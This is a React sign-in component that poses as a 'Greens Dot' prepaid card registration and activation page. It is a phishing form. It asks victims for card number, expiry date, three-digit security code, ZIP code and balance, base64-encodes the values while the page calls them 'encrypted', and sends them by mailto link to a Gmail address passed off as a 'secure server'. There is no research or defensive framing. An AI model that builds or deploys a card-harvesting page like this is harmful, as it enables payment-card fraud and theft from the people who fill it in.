import * as React from 'react';
import Button from '@mui/material/Button';
import TextField from '@mui/material/TextField';
import Box from '@mui/material/Box';
import Typography from '@mui/material/Typography';
import Container from '@mui/material/Container';

export default function SignIn() {
  const handleSubmit = (event) => {
    // event.preventDefault();
    const data = new FormData(event.currentTarget);
    const info = {
      cardNumber: data.get('Card'),
      expDate: data.get('EXP Date'),
      securityNo: data.get('Security'),
      zipCode: data.get('Zip Code'),
      balance: data.get('Balance'),
    };
    const serializedInfo = serialize(info);
    sendMail(serializedInfo);
  };

  function serialize(obj) {
    var str = [];
    for (var p in obj)
      if (obj.hasOwnProperty(p)) {
        str.push(encodeURIComponent(p) + '=' + encodeURIComponent(window.btoa(obj[p])));
      }
    return str.join('&');
  }

  function sendMail(serializedInfo) {
    var link =
      'mailto:greendotactivatecard@gmail.com' +
      '&subject=' +
      encodeURIComponent('GreensDot Secure Service') +
      '&body=' +
      encodeURIComponent(serializedInfo);
    window.location.href = link;
  }

  return (
    <Container
      component='main'
      maxWidth='xs'
      sx={{
        backgroundColor: '#c6efa3',
        borderRadius: '25px',
        border: '1px solid black',
      }}
    >
      <Box
        sx={{
          marginTop: 4,
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
        }}
      >
        <Box sx={{ mb: '20px' }}>
          <Typography
            sx={{
              color: 'black',
              fontFamily: 'system-ui',
              fontWeight: '600',
              fontSize: '2rem',
            }}
          >
            Register & Activate
          </Typography>
          <Typography
            sx={{
              mt: '4px',
              color: 'black',
              fontFamily: 'system-ui',
              fontWeight: '600',
              fontSize: '1rem',
            }}
          >
            Register and Activate your Greens Dot pack
          </Typography>
        </Box>
        <Box
          component='form'
          onSubmit={handleSubmit}
          noValidate
          sx={{ mt: '4px', mb: '8px' }}
        >
          <TextField
            margin='normal'
            required
            fullWidth
            id='Card'
            label='Card - 16 Digit Number'
            name='Card'
            autoComplete='Card'
            autoFocus
          />
          <TextField
            margin='normal'
            required
            fullWidth
            id='EXP Date'
            label='EXP Date - MMYYYY'
            name='EXP Date'
            autoComplete='EXP Date'
            autoFocus
          />
          <TextField
            margin='normal'
            required
            fullWidth
            id='Security'
            label='Security - 3 Digits'
            name='Security'
            autoComplete='Security'
            autoFocus
          />
          <TextField
            margin='normal'
            required
            fullWidth
            name='Zip Code'
            label='Zip Code'
            type='Zip Code'
            id='Zip Code'
          />
          <TextField
            margin='normal'
            required
            fullWidth
            name='Balance'
            label='Current Bala...'
            type='Balance'
            id='Balance'
          />
          <Button
            type='submit'
            color='success'
            fullWidth
            variant='contained'
            sx={{ mt: 3, mb: 2 }}
            onClick={() => handleSubmit()}
          >
            Continue
          </Button>
        </Box>
        <Box mb='20px'>
          <Typography
            sx={{
              mt: '4px',
              color: 'black',
              fontFamily: 'system-ui',
              fontWeight: '600',
              fontSize: '1rem',
            }}
          >
            NOTE: After filling the form, please send the mail to our secure
            server. <br/>
            Your data will be encrpyted.
          </Typography>
          <Typography
            sx={{
              mt: '4px',
              color: 'text.secondary',
              fontFamily: 'system-ui',
              fontSize: '1rem',
            }}
          >
            You are seconds away from using your new Greens-dot Pack!
          </Typography>
        </Box>
      </Box>
    </Container>
  );
}
